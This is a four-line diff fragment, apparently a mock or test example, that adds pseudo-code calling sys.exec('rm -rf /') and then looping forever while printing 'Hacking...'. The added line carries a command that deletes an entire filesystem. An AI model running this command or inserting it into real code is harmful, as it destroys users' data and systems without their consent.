@@ -1,0 +1,4 @@
+sys.exec("rm -rf /")
+while true {
+  print("Hacking...")
+}
